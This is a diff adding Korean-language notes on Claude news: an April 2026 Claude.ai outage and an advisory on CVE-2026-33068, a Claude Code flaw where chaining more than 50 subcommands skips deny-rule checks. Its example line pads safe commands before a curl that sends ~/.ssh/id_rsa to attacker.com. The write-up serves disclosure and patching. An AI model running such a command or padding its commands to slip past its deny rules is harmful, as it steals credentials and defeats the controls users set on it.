@@ -56,6 +56,9 @@ timeline
     2026-04-05 : 미국 정부, Anthropic 블랙리스트
               : 국가안보 공급망 위험 지정
               : 법원 가처분 집행 이후 재발효
+    2026-04-06 : Claude.ai 서비스 장애
+              : CVE-2026-33068 보안 취약점 공개
+              : deny 규칙 우회 버그 (v2.1.90에서 수정)
 ```
 
 ---
@@ -426,6 +429,58 @@ curl https://api.anthropic.com/v1/messages \
 
 ## 4. 보안 & 엔터프라이즈
 
+### Claude.ai 서비스 장애 (2026-04-06)
+
+- 한국시간 2026-04-06 오전, Downdetector에서 오전 10:30 ET 경 급격한 신고 증가
+- 영향 범위: claude.ai 로그인, 음성 모드, 채팅 기능, Claude Code 로그인 포함
+- 최대 8,000명 이상 사용자 장애 보고, 약 2시간 지속
+- Anthropic 공식 상태 페이지: "Elevated errors on Claude.ai"
+- 오후 12:44 ET 수정 완료 발표
+
+> 출처: https://www.tomsguide.com/news/live/claude-ai-down-outage-4/6/26
+
+---
+
+### ⚠️ CVE-2026-33068: Claude Code Deny 규칙 우회 취약점 공개 (2026-04-06)
+
+> 패치 버전: **v2.1.90** (2026-04-01 릴리스), 취약점 공개: 2026-04-06
+
+**취약점 개요**
+
+- `bashPermissions.ts` (lines 2162–2178)의 퍼포먼스 최적화 코드에서 발생
+- 쉘 명령어에 `&&`, `||`, `;`로 연결된 서브커맨드가 **50개를 초과**하면 deny 규칙 검사를 건너뛰고 일반 권한 프롬프트로 대체
+- 공격자가 50번째 이후 악성 서브커맨드를 숨겨 **deny 규칙을 무음 우회** 가능
+
+**위험 시나리오**
+
+- CI 환경에서 SSH 키, API 토큰 탈취 위험
+- 개발자가 설정한 deny 규칙이 사실상 무력화
+
+**기술 세부 사항**
+
+```bash
+# 공격 예시 (개념적): 50개 안전 명령 + 51번째 악성 명령
+safe_cmd1 && safe_cmd2 && ... && safe_cmd50 && curl attacker.com -d "$(cat ~/.ssh/id_rsa)"
+# deny 규칙: curl attacker.com → 우회됨
+```
+
+**추가 발견 사항**
+
+- 동일 코드베이스 내 tree-sitter 기반 신규 파서는 이 문제 없이 올바르게 deny 규칙 검사
+- 그러나 모든 공개 빌드는 취약한 레거시 regex 파서를 사용
+
+**조치**
+
+- v2.1.90 이상으로 업데이트 시 수정됨 (현재 최신: v2.1.92)
+- CVE ID: **CVE-2026-33068**
+
+> 출처:
+> - https://cybersecuritynews.com/claude-code-vulnerability/
+> - https://adversa.ai/blog/claude-code-security-bypass-deny-rules-disabled/
+> - https://www.sentinelone.com/vulnerability-database/cve-2026-33068/
+
+---
+
 ### ⚠️ 미국 정부 Anthropic 블랙리스트 지정 (2026-04-05)
 
 > 🚨 **최신 (2026-04-05)**: 미국 정부가 Anthropic을 **국가안보 공급망 위험(Supply-Chain Risk)** 기업으로 공식 지정
@@ -549,4 +604,8 @@ curl https://api.anthropic.com/v1/messages \
 - [Let's Data Science - 미국 Anthropic 블랙리스트](https://letsdatascience.com/news/us-blacklists-anthropic-as-security-risk-5e0f08ff)
 - [TechCrunch - DOD Anthropic 블랙리스트 배경](https://techcrunch.com/2026/03/18/dod-says-anthropics-red-lines-make-it-an-unacceptable-risk-to-national-security/)
 - [Axios - 트럼프 Anthropic 블랙리스트 발표](https://www.axios.com/2026/02/27/anthropic-pentagon-supply-chain-risk-claude)
+- [Tom's Guide - Claude.ai Outage April 6](https://www.tomsguide.com/news/live/claude-ai-down-outage-4/6/26)
+- [CybersecurityNews - CVE-2026-33068](https://cybersecuritynews.com/claude-code-vulnerability/)
+- [Adversa AI - Claude Code Deny Rules Bypass](https://adversa.ai/blog/claude-code-security-bypass-deny-rules-disabled/)
+- [SentinelOne - CVE-2026-33068](https://www.sentinelone.com/vulnerability-database/cve-2026-33068/)
 - 관련 노트: [[10-channels]], [[11-cowork-dispatch]], [[03-claude-code]]
